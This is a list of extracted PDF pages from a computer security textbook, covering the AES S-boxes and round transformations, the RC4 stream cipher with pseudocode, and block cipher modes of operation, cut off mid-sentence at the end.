       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 640, 'page_label': '639'}, page_content='20.3 / AdVAnCEd EnCRyPTion STAndARd  639\\n(a) S-box\\ny\\nx\\n0 1 2 3 4 5 6 7 8 9 A B C D E F\\n0 63 7C 77 7B F2 6B 6F C5 30 01 67 2B FE D7 AB 76\\n1 CA 82 C9 7D FA 59 47 F0 AD D4 A2 AF 9C A4 72 C0\\n2 B7 FD 93 26 36 3F F7 CC 34 A5 E5 F1 71 D8 31 15\\n3 04 C7 23 C3 18 96 05 9A 07 12 80 E2 EB 27 B2 75\\n4 09 83 2C 1A 1B 6E 5A A0 52 3B D6 B3 29 E3 2F 84\\n5 53 D1 00 ED 20 FC BI 5B 6A CB BE 39 4A 4C 58 CF\\n6 D0 EF AA FB 43 4D 33 85 45 F9 02 7F 50 3C 9F A8\\n7 51 A3 40 8F 92 9D 38 F5 BC B6 DA 21 10 FF F3 D2\\n8 CD 0C 13 EC 5F 97 44 17 C4 A7 7E 3D 64 5D 19 73\\n9 60 81 4F DC 22 2A 90 88 46 EE B8 14 DE 5E 0B DB\\nA E0 32 3A 0A 49 06 24 5C C2 D3 AC 62 91 95 E4 79\\nB E7 C8 37 6D 8D D5 4E A9 6C 56 F4 EA 65 7A AE 08\\nC BA 78 25 2E 1C A6 B4 C6 E8 DD 74 1F 4B BD 8B 8A\\nD 70 3E B5 66 48 03 F6 0E 61 35 57 B9 86 C1 1D 9E\\nE E1 F8 98 11 69 D9 8E 94 9B 1E 87 E9 CE 55 28 DF\\nF 8C A1 89 0D BF E6 42 68 41 99 2D 0F B0 54 BB 16\\n(b) Inverse S-box\\ny\\nx\\n0 1 2 3 4 5 6 7 8 9 A B C D E F\\n0 52 09 6A D5 30 36 A5 38 BF 40 A3 9E 81 F3 D7 FB\\n1 7C E3 39 82 9B 2F FF 87 34 8E 43 44 C4 DE E9 CB\\n2 54 7B 94 32 A6 C2 23 3D EE 4C 95 0B 42 FA C3 4E\\n3 08 2E A1 66 28 D9 24 B2 76 5B A2 49 6D 8B D1 25\\n4 72 F8 F6 64 86 68 98 16 D4 A4 5C CC 5D 65 B6 92\\n5 6C 70 48 50 FD ED B9 DA 5E 15 46 57 A7 8D 9D 84\\n6 90 D8 AB 00 8C BC D3 0A F7 E4 58 05 B8 B3 45 06\\n7 D0 2C 1E 8F CA 3F 0F 02 C1 AF BD 03 01 13 8A 6B\\n8 3A 91 11 41 4F 67 DC EA 97 F2 CF CE F0 B4 E6 73\\n9 96 AC 74 22 E7 AD 35 85 E2 F9 37 E8 1C 75 DF 6E\\nA 47 F1 1A 71 1D 29 C5 89 6F B7 62 0E AA 18 BE 1B\\nB FC 56 3E 4B C6 D2 79 20 9A DB C0 FE 78 CD 5A FA\\nC 1F DD A8 33 88 07 C7 31 B1 12 10 59 27 80 EC 5F\\nD 60 51 7F A9 19 B5 4A 0D 2D E5 7A 9F 93 C9 9C EF\\nE A0 E0 3B 4D AE 2A F5 B0 C8 EB BB 3C 83 53 99 61\\nF 17 2B 04 7E BA 77 D6 26 E1 69 14 63 55 21 0C 7D\\nTable 20.2 AES S-Boxes\\nM20_STAL0611_04_GE_C20.indd   639 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 641, 'page_label': '640'}, page_content='640  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nThe inverse shift row transformation, called InvShiftRows, performs the circular \\nshifts in the opposite direction for each of the last three rows, with a 1 -byte circular \\nright shift for the second row, and so on.\\nThe shift row transformation is more substantial than it may first appear. This \\nis because the State, as well as the cipher input and output, is treated as an array of \\nfour 4-byte columns. Thus, on encryption, the first 4 bytes of the plaintext are cop -\\nied to the first column of State, and so on. Further, as will be seen, the round key is \\napplied to State column by column. Thus, a row shift moves an individual byte from \\none column to another, which is a linear distance of a multiple of 4 bytes. In addi -\\ntion, note the transformation ensures that the 4 bytes of one column are spread out \\nto four different columns.\\nmix C olumn  tran Sformation  The forward mix column transformation , \\ncalled MixColumns, operates on each column individually. Each byte of a column \\nis mapped into a new value that is a function of all 4 bytes in the column. The \\nmapping makes use of equations over finite fields. The following is an example of \\nMixColumns:\\n87 F2 4D 97\\n6E 4C 90 EC\\n46 E7 4A C3\\nA6 8C D8 95\\n47 40 A3 4C\\n37 D4 70 9F\\n94 E4 3A 42\\nED A5 A6 BC\\nThe mapping is designed to provide a good mixing among the bytes of each \\ncolumn. The mix column transformation combined with the shift row transformation \\nensures that after a few rounds, all output bits depend on all input bits.\\nadd round Key tranSformation In the forward add round key transformation, \\ncalled AddRoundKey, the 128 bits of State are bitwise XORed with the 128 bits of \\nthe round key. The operation is viewed as a column-wise operation between the four \\nbytes of a State column and one word of the round key; it can also be viewed as a \\nbyte-level operation. The following is an example of AddRoundKey:\\nEB 59 8B 1B\\n40 2E A1 C3\\nF2 38 13 42\\n1E 84 E7 D2\\n47 40 A3 4C\\n37 D4 70 9F\\n94 E4 3A 42\\nED A5 A6 BC\\nAC 19 28 57\\n77 FA D1 5C\\n66 DC 29 00\\nED A5 A6 BC\\n+ =\\nThe first matrix is State, and the second matrix is the round key.\\nThe inverse add round key transformation is identical to the forward add round \\nkey transformation, because the XOR operation is its own inverse.\\nThe add round key transformation is as simple as possible and affects every bit \\nof State. The complexity of the round key expansion, plus the complexity of the other \\nstages of AES, ensure security.\\nM20_STAL0611_04_GE_C20.indd   640 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 642, 'page_label': '641'}, page_content='20.4 / STREAM CiPHERS And RC4  641\\naeS Key expanSion The AES key expansion algorithm takes as input a 4-word \\n(16-byte) key and produces a linear array of 44 words (156 bytes). This is sufficient \\nto provide a 4-word round key for the initial Add Round Key stage and each of the \\n10 rounds of the cipher.\\nThe key is copied into the first four words of the expanded key. The remainder \\nof the expanded key is filled in four words at a time. Each added word w[i] depends \\non the immediately preceding word, w[i - 1], and the word four positions back, \\nw[i - 4]. A complex finite-field algorithm is used in generating the expanded key.\\n 20.4 STREAM CIPHERS AND RC4\\nA block cipher processes the input one block of elements at a time, producing an \\noutput block for each input block. A stream cipher  processes the input elements \\n continuously, producing output one element at a time, as it goes along. Although \\nblock ciphers are far more common, there are certain applications in which a stream \\ncipher is more appropriate. Examples are given subsequently in this book. In this \\n section, we look at perhaps the most popular symmetric stream cipher, RC4. We begin \\nwith an overview of stream cipher structure, then examine RC4.\\nStream Cipher Structure\\nA typical stream cipher encrypts plaintext 1 byte at a time, although a stream cipher \\nmay be designed to operate on 1 bit at a time or on units larger than a byte at a time. \\nFigure 2.3b is a representative diagram of stream cipher structure. In this structure, a \\nkey is input to a pseudorandom bit generator that produces a stream of 8-bit numbers \\nthat are apparently random. A pseudorandom stream is one that is unpredictable \\nwithout knowledge of the input key and that has an apparently random character. \\nThe output of the generator, called a keystream, is combined 1 byte at a time with \\nthe plaintext stream using the bitwise exclusive-OR (XOR) operation. For example, \\nif the next byte generated by the generator is 01101100 and the next plaintext byte \\nis 11001100, then the resulting ciphertext byte is:\\n    11001100 plaintext\\n/uni2295.alt 01101100 key stream\\n    10100000 ciphertext\\nDecryption requires the use of the same pseudorandom sequence:\\n    10100000 ciphertext\\n/uni2295.alt 01101100 key stream\\n    11001100 plaintext\\nWith a properly designed pseudorandom number generator, a stream cipher \\ncan be as secure as block cipher of comparable key length. The primary advantage of \\na stream cipher is that stream ciphers are almost always faster and use far less code \\nM20_STAL0611_04_GE_C20.indd   641 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 643, 'page_label': '642'}, page_content='642  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nthan do block ciphers. The example in this section, RC4, can be implemented in just \\na few lines of code. Figure 20.5, based on results in [SING11], compares execution \\ntimes of RC4 with two modes of the symmetric block cipher AES. The advantage of \\na block cipher is that you can reuse keys. However, if two plaintexts are encrypted \\nwith the same key using a stream cipher, then cryptanalysis is often quite simple \\n[DAWS96]. If\\xa0the two ciphertext streams are XORed together, the result is the XOR \\nof the original plaintexts. If the plaintexts are text strings, credit card numbers, or \\nother byte streams with known properties, then cryptanalysis may be successful.\\nFor applications that require encryption/decryption of a stream of data, such as \\nover a data communications channel or a browser/Web link, a stream cipher might \\nbe the better alternative. For applications that deal with blocks of data, such as file \\ntransfer, e-mail, and database, block ciphers may be more appropriate. However, \\neither type of cipher can be used in virtually any application.\\nThe RC4 Algorithm\\nRC4 is a stream cipher designed in 1987 by Ron Rivest for RSA Security. It is a \\nvariable-key-size stream cipher with byte-oriented operations. The algorithm is based \\non the use of a random permutation. Analysis shows that the period of the cipher is \\noverwhelmingly likely to be greater than 10100 [ROBS95]. Eight to sixteen machine \\noperations are required per output byte, and the cipher can be expected to run very \\nquickly in software. RC4 is used in the SSL/TLS (Secure Sockets Layer/Transport \\nLayer Security) standards that have been defined for communication between Web \\nbrowsers and servers. It is also used in the WEP (Wired Equivalent Privacy) proto-\\ncol and the newer WiFi Protected Access (WPA) protocol that are part of the IEEE \\n802.11 wireless LAN standard. RC4 was kept as a trade secret by RSA Security. \\nIn\\xa0September 1994, the RC4 algorithm was anonymously posted on the Internet on \\nthe Cypherpunks anonymous remailers list.\\nThe RC4 algorithm is remarkably simple and quite easy to explain. A variable-\\nlength key of from 1 to 256 bytes (8 to 2048 bits) is used to initialize a 256-byte state \\nFigure 20.5 Performance Comparison of Symmetric Ciphers on a 3-GHz Processor\\nE = encryption\\nD = decryption\\nE D\\nRC4-128\\nThroughput (Mbps)\\n 0\\n 2\\n 4\\n 6\\n 8\\n 10\\n 12\\nE D\\nRC4-192\\nE D\\nRC4-256\\nE D\\nAES\\nECB-128\\nAES\\nECB-192\\nAES\\nECB-256\\nAES\\nCBC-128\\nAES\\nCBC-192\\nAES\\nCBC-256\\nE D E D E D E D E D\\nM20_STAL0611_04_GE_C20.indd   642 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 644, 'page_label': '643'}, page_content='20.4 / STREAM CiPHERS And RC4  643\\nvector S, with elements S[0], S[1], c, S[255]. At all times, S contains a permutation \\nof all 8-bit numbers from 0 through 255. For encryption and decryption, a byte k \\n(see Figure 2.3b) is generated from S by selecting one of the 255 entries in a sys -\\ntematic fashion. As each value of k is generated, the entries in S are once again \\npermuted.\\ninitialization  of S To begin, the entries of S are set equal to the values from \\n0\\xa0 through 255 in ascending order; that is, S[0] = 0, S[1] = 1, c, S[255] = 255. \\nA\\xa0temporary vector, T, is also created. If the length of the key K is 256 bytes, then K\\xa0is \\ntransferred to T. Otherwise, for a key of length keylen bytes, the first keylen  elements \\nof T are copied from K and then K is repeated as many times as necessary to fill out \\nT. These preliminary operations can be summarized as follows:\\n/* Initialization */\\nfor i = 0 to 255 do\\nS[i] =i;\\nT[i] = K[i mod keylen];\\nNext we use T to produce the initial permutation of S. This involves starting \\nwith S[0] and going through to S[255], and, for each S[i], swapping S[i] with another \\nbyte in S according to a scheme dictated by T[i]:\\n/* Initial Permutation of S */\\nj = 0;\\nfor i = 0 to 255 do \\n  j = (j + S[i] + T[i]) mod 256;\\n  Swap (S[i], S[j]);\\nBecause the only operation on S is a swap, the only effect is a permutation. \\nS\\xa0still contains all the numbers from 0 through 255.\\nStream Generation Once the S vector is initialized,  the input key is no longer \\nused. Stream generation involves cycling through all the elements of S[i], and, for \\neach S[i], swapping S[i] with another byte in S according to a scheme dictated by the \\ncurrent configuration of S. After S[255] is reached, the process continues, starting \\nover again at S[0]:\\n/* Stream Generation */\\ni, j = 0;\\nwhile (true)\\n   i = (i + 1) mod 256;\\n   j = (j + S[i]) mod 256;\\n   Swap (S[i], S[j]);\\n   t = (S[i] + S[j]) mod 256;\\n   k = S[t];\\nTo encrypt, XOR the value k with the next byte of plaintext. To decrypt, XOR \\nthe value k with the next byte of ciphertext.\\nFigure 20.6 illustrates the RC4 logic.\\nM20_STAL0611_04_GE_C20.indd   643 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 645, 'page_label': '644'}, page_content='644  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nStrenGth of rC4 A number of papers have been published analyzing methods  \\nof attacking RC4. None of these approaches is practical against RC4 with a reason-\\nable key length, such as 128 bits. A more serious problem is reported in [FLUH01]. \\nThe authors demonstrate that the WEP protocol, intended to provide confidentiality \\non 802.11 wireless LAN networks, is vulnerable to a particular attack approach. In \\nessence, the problem is not with RC4 itself but, the way in which keys are generated for \\nuse as input to RC4. This particular problem does not appear to be relevant to other \\napplications using RC4 and can be remedied in WEP by changing the way in which \\nkeys are generated. This problem points out the difficulty in designing a secure system \\nthat involves both cryptographic functions and protocols that make use of them.\\n 20.5 CIPHER BLOCK MODES OF OPERATION\\nA symmetric block cipher processes one block of data at a time. In the case of DES \\nand 3DES, the block length is 64 bits. For longer amounts of plaintext, it is necessary \\nto break the plaintext into 64-bit blocks (padding the last block if necessary). To apply \\na block cipher in a variety of applications, five modes of operation have been defined \\nby NIST SP 800-38A (Recommendation for Block Cipher Modes of Operation: Meth-\\nods and Techniques, December 2001). The five modes are intended to cover virtually \\nall the possible applications of encryption for which a block cipher could be used. \\nFigure 20.6 RC4\\n255 254 25343 2 1 0S\\nT\\nS\\n(a) Initial state of S and T\\n(b) Initial permutation of S\\nSwap\\nT\\nK\\nT[i]\\nj  =  j  +  S[i]  +  T[i]\\nt  =  S[i]  +  S[j]\\nS[i] S[j]\\nkeylen\\ni\\nS\\n(c) Stream generation\\nSwap\\nj  =  j  +  S[i]\\nS[i] S[j] S[t]\\nk\\ni\\nM20_STAL0611_04_GE_C20.indd   644 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 646, 'page_label': '645'}, page_content='20.5 / CiPHER BloCK ModES of oPERATion  645\\nThese modes are intended for use with any symmetric block cipher, including triple \\nDES and AES. The modes are summarized in Table 20.3, and the most important are \\ndescribed briefly in the remainder of this section.\\nElectronic Codebook Mode\\nThe simplest way to proceed is what is known as electronic codebook (ECB) mode, \\nin which plaintext is handled b bits at a time and each block of plaintext is encrypted \\nusing the same key (see Figure 2.3a). The term codebook is used because, for a given \\nkey, there is a unique ciphertext for every b-bit block of plaintext. Therefore, one \\ncan imagine a gigantic codebook in which there is an entry for every possible b-bit \\nplaintext pattern showing its corresponding ciphertext.\\nWith ECB, if the same b-bit block of plaintext appears more than once in the \\nmessage, it always produces the same ciphertext. Because of this, for lengthy  messages, \\nthe ECB mode may not be secure. If the message is highly structured, it may be pos-\\nsible for a cryptanalyst to exploit these regularities. For example, if it is known that \\nthe message always starts out with certain predefined fields, then the cryptanalyst \\nmay have a number of known plaintext–ciphertext pairs with which to work. If\\xa0the \\nmessage has repetitive elements, with a period of repetition a multiple of b-bits, then \\nthese elements can be identified by the analyst. This may help in the analysis or may \\nprovide an opportunity for substituting or rearranging blocks.\\nTo overcome the security deficiencies of ECB, we would like a technique in \\nwhich the same plaintext block, if repeated, produces different ciphertext blocks.\\nCipher Block Chaining Mode\\nIn the cipher block chaining (CBC) mode (see Figure 20.7), the input to the encryp-\\ntion algorithm is the XOR of the current plaintext block and the preceding ciphertext \\nMode Description Typical Application\\nElectronic Code \\nbook (ECB)\\nEach block of 64 plaintext bits is encoded \\n independently using the same key.\\n• Secure transmission of single \\nvalues (e.g., an encryption key)\\nCipher Block \\nChaining  \\n(CBC)\\nThe input to the encryption algorithm is the XOR of \\nthe next 64 bits of plaintext and the preceding 64 bits \\nof ciphertext.\\n• General-purpose block-oriented \\ntransmission\\n• Authentication\\nCipher \\n Feedback \\n(CFB)\\nInput is processed s bits at a time. Preceding cipher-\\ntext is used as input to the encryption algorithm to \\nproduce pseudorandom output, which is XORed \\nwith plaintext to produce next unit of ciphertext.\\n• General-purpose stream- \\noriented transmission\\n• Authentication\\nOutput \\n Feedback \\n(OFB)\\nSimilar to CFB, except that the input to the \\n encryption algorithm is the preceding DES output.\\n• Stream-oriented transmission \\nover noisy channel (e.g., satellite \\ncommunication)\\nCounter (CTR) Each block of plaintext is XORed with an encrypted \\ncounter. The counter is incremented for each subse-\\nquent block.\\n• General-purpose block-oriented \\ntransmission\\n• Useful for high-speed \\nrequirements\\nTable 20.3 Block Cipher Modes of Operation\\nM20_STAL0611_04_GE_C20.indd   645 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 647, 'page_label': '646'}, page_content='646  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nblock; the same key is used for each block. In effect, we have chained together the \\nprocessing of the sequence of plaintext blocks. The input to the encryption function \\nfor each plaintext block bears no fixed relationship to the plaintext block. Therefore, \\nrepeating patterns of b-bits are not exposed.\\nFor decryption, each cipher block is passed through the decryption algorithm. \\nThe result is XORed with the preceding ciphertext block to produce the plaintext \\nblock. To see that this works, we can write\\nCj = E(K, [Cj- 1 /uni2295.altPj])\\nwhere E[K, X] is the encryption of plaintext X using key K, and /uni2295.alt is the exclusive-\\nOR operation. Then\\nD(K, Cj) = D(K, E(K, [Cj - i /uni2295.altPj]))\\nD(K, Cj) = Cj- 1 /uni2295.altPj\\nCj- 1 /uni2295.altD(K, Cj) = Cj - 1 /uni2295.altCj - 1 /uni2295.altPj = Pj\\nwhich verifies Figure 20.7b.\\nTo produce the first block of ciphertext, an initialization vector (IV) is XORed \\nwith the first block of plaintext. On decryption, the IV is XORed with the output of \\nthe decryption algorithm to recover the first block of plaintext.\\nThe IV must be known to both the sender and receiver. For maximum security, \\nthe IV should be protected as well as the key. This could be done by sending the IV \\nFigure 20.7 Cipher Block Chaining (CBC) Mode\\nEncrypt\\nTime  =  1\\nIV\\nK\\nP1\\nC1\\nK\\nIV\\nEncrypt\\nTime  =  2\\nP2\\nC2\\nEncrypt\\nTime  =  N\\nPN\\nP1\\nCN\\nC1 C2 CN\\nCN - 1\\nCN - 1\\nP2 PN\\nDecryptK K KDecrypt Decrypt\\nK\\n(a) Encryption\\n(b) Decryption\\nM20_STAL0611_04_GE_C20.indd   646 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 648, 'page_label': '647'}, page_content='20.5 / CiPHER BloCK ModES of oPERATion  647\\nusing ECB encryption. One reason for protecting the IV is as follows: If an opponent \\nis able to fool the receiver into using a different value for IV , then the opponent is \\nable to invert selected bits in the first block of plaintext. To see this, consider the \\nfollowing:\\n C1 = E(K, [IV /uni2295.altP1])\\n P1 = IV /uni2295.altD(K, C1)\\nNow use the notation that X[  j] denotes the jth bit of the b-bit quantity X. Then\\nP1[i] = IV[i] /uni2295.altD(K, C1)[i]\\nThen, using the properties of XOR, we can state\\nP1[i]/uni2032= IV[i]/uni2032 /uni2295.altD(K, C1)[i]\\nwhere the prime notation denotes bit complementation. This means that if an oppo-\\nnent can predictably change bits in IV , the corresponding bits of the received value \\nof P1 can be changed.\\nCipher Feedback Mode\\nIt is possible to convert any block cipher into a stream cipher by using the cipher \\nfeedback (CFB) mode. A stream cipher eliminates the need to pad a message to be an \\nintegral number of blocks. It also can operate in real time. Thus, if a character stream \\nis being transmitted, each character can be encrypted and transmitted immediately \\nusing a character-oriented stream cipher.\\nOne desirable property of a stream cipher is that the ciphertext be of the same \\nlength as the plaintext. Thus, if 8-bit characters are being transmitted, each character \\nshould be encrypted using 8 bits. If more than 8 bits are used, transmission capacity \\nis wasted.\\nFigure 20.8 depicts the CFB scheme. In the figure, it is assumed that the unit of \\ntransmission is s bits; a common value is s = 8. As with CBC, the units of plaintext \\nare chained together, so the ciphertext of any plaintext unit is a function of all the \\npreceding plaintext.\\nFirst, consider encryption. The input to the encryption function is a b-bit shift \\nregister that is initially set to some initialization vector (IV). The leftmost (most sig-\\nnificant) s bits of the output of the encryption function are XORed with the first unit \\nof plaintext P1 to produce the first unit of ciphertext C1, which is then transmitted. \\nIn addition, the contents of the shift register are shifted left by s bits and C1 is placed \\nin the rightmost (least significant) s bits of the shift register. This process continues \\nuntil all plaintext units have been encrypted.\\nFor decryption, the same scheme is used, except that the received ciphertext \\nunit is XORed with the output of the encryption function to produce the plaintext \\nunit. Note that it is the encryption function that is used, not the decryption function. \\nThis is easily explained. Let Ss(X) be defined as the most significant s bits of X. Then\\nC1 = P1 /uni2295.altSs[E(K, IV)]\\nM20_STAL0611_04_GE_C20.indd   647 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 649, 'page_label': '648'}, page_content='648  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nTherefore,\\nP1 = C1 /uni2295.altSs[E(K, IV)]\\nThe same reasoning holds for subsequent steps in the process.\\nCounter Mode\\nAlthough interest in the counter mode (CTR) has increased recently, with  applications \\nto ATM (asynchronous transfer mode) network security and IPSec (IP security), this \\nmode was proposed early on (e.g., [DIFF79]).\\nFigure 20. 9 depicts the CTR mode. A counter equal to the plaintext block \\nsize is used. The only requirement stated in SP 800-38A is that the counter value \\nmust be different for each plaintext block that is encrypted. Typically, the counter \\nis initialized to some value and then incremented by 1 for each subsequent block \\n(modulo 2b, where b is the block size). For encryption, the counter is encrypted then \\nXORed\\xa0with the plaintext block to produce the ciphertext block; there is no chain -\\ning. For decryption, the same sequence of counter values is used, with each encrypted \\ncounter XORed with a ciphertext block to recover the corresponding plaintext block.\\nFigure 20.8 s-bit Cipher Feedback (CFB) Mode\\nEncrypt\\nIV\\nK\\nC1\\n(a) Encryption\\nb – s bits\\n64\\ns bits\\nShift register\\nb – s bitss bits\\nSelect Discard\\nP1\\n64\\ns\\ns\\ns\\nEncryptK\\nb – s bits\\n64\\ns bits\\nShift register\\nb – s bitss bits\\nSelect Discard\\nP2\\n64\\ns\\ns\\nC2\\nEncryptK\\nb – s bits\\n64\\ns bits\\nShift register\\nb – s bitss bits\\nSelect Discard\\nPM\\n64\\ns\\ns\\nCM\\nC M  - 1\\nEncrypt\\nIV\\nK\\nP1\\n(b) Decryption\\nb – s bits\\n64\\ns bits\\nShift register\\nb – s bitss bits\\nSelect Discard\\nC1\\n64\\ns\\ns\\ns\\nC2\\ns s\\nEncryptK\\nb – s bits\\n64\\ns bits\\nShift register\\nb – s bitss bits\\nSelect Discard\\n64\\ns\\nP2\\nEncryptK\\nb – s bits\\n64\\ns bits\\nShift register\\nb – s bitss bits\\nSelect Discard\\nCM\\n64\\ns\\nPM\\nC M  - 1\\nM20_STAL0611_04_GE_C20.indd   648 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 650, 'page_label': '649'}, page_content='20.5 / CiPHER BloCK ModES of oPERATion  649\\n[LIPM00] lists the following advantages of CTR mode:\\n• Hardware efficiency:  Unlike the three chaining modes, encryption (or \\n decryption) in CTR mode can be done in parallel on multiple blocks of plain-\\ntext or ciphertext. For the chaining modes, the algorithm must complete the \\ncomputation on one block before beginning on the next block. This limits \\nthe\\xa0maximum throughput of the algorithm to the reciprocal of the time for one \\nexecution of block encryption or decryption. In CTR mode, the throughput is \\nonly limited by the amount of parallelism that is achieved.\\n• Software efficiency: Similarly, because of the opportunities for parallel  execution \\nin CTR mode, processors that support parallel features, such as aggressive pipe-\\nlining, multiple instruction dispatch per clock cycle, a large number of registers, \\nand SIMD instructions, can be effectively utilized.\\n• Preprocessing: The execution of the underlying encryption algorithm does not \\ndepend on input of the plaintext or ciphertext. Therefore, if sufficient memory \\nis available and security is maintained, preprocessing can be used to prepare the \\noutput of the encryption boxes that feed into the XOR functions in Figure 20.9. \\nWhen the plaintext or ciphertext input is presented, then the only computation \\nis a series of XORs. Such a strategy greatly enhances throughput.\\n• Random access: The ith block of plaintext or ciphertext can be processed in \\nrandom access fashion. With the chaining modes, block Ci cannot be com -\\nputed until the i - 1 prior block are computed. There may be applications in \\nFigure 20.9 Counter (CTR) Mode\\n(a) Encryption\\nEncrypt\\nCounter\\nK\\nP1\\nC1\\nEncrypt\\nCounter  +  1\\nK\\nP2\\nC2\\nEncrypt\\nCounter  +  N  -  1\\nK\\nPN\\nCN\\nEncrypt\\nCounter\\nK\\nC1\\nP1\\n(b) Decryption\\nEncrypt\\nCounter  +  1\\nK\\nC2\\nP2\\nEncrypt\\nCounter  +  N  -  1\\nK\\nCN\\nPN\\nM20_STAL0611_04_GE_C20.indd   649 10/11/17   3:19 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 651, 'page_label': '650'}, page_content='650  CHAPTER 20 / SyMMETRiC EnCRyPTion And MESSAgE ConfidEnTiAliTy\\nwhich a ciphertext is stored and it is desired to decrypt just one block; for such \\n applications, the random access feature is attractive.\\n• Provable security: It can be shown that CTR is at least as secure as the other \\nmodes discussed in this section.\\n• Simplicity: Unlike ECB and CBC modes, CTR mode requires only the imple-\\nmentation of the encryption algorithm and not the decryption algorithm. This \\nmatters most when the decryption 